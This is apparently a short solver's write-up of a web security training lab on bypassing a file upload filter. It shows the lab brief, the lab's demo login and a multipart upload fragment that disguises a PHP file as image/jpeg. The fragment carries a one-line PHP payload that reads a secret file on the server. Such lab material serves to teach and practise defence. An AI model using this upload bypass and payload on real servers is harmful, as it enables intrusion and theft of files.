Lab: Web shell upload via Content-Type restriction bypass


 This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

same as last, just need to verify the type to be image/jpg or png

Content-Disposition: form-data; name="avatar"; filename="dcadcb65a0d09398fa3cce9d46c55423.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
